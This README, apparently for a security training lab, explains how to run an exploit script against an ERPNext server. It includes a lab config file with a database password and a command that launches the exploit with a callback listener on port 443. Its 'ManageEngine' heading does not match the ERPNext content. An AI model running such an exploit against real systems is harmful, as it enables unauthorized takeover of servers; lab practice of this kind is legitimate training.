# ManageEngine

To run the exploit follow this steps.
1. Configure ERPNext SMTP server. Connect via `ssh` to the erpnext machine and change the content of `/home/frappe/frappe-bench/sites/site1.local/site_config.json` with:
```json
{
 "db_name": "_1bd3e0294da19198",
 "db_password": "32ldabYvxQanK4jj",
 "db_type": "mariadb",
 "mail_server": "<YOUR KALI IP>",
 "use_ssl": 0,
 "mail_port": 25,
 "auto_email_id": "admin@randomdomain.com"
}
```
*This is a lab requirement, not an exploit requirement.*
2. Start the application
```bash
cd /home/frappe/frappe-bench
bench start
```
3. Then you can run the exploit as follows:
```bash
python3 exploit.py -t http://erpnext:8000 -l 192.168.45.214 -p 443
```
![ManageEngine example](/.images/erpnext.png)

> [!NOTE]
> If you are getting errors on `[step 2] Status Code 500`, Sometimes this means there is already a password reset request in the database.
> If the exploit keeps failing, try to restart the lab and re-configure the `/home/frappe/frappe-bench/sites/site1.local/site_config.json` file.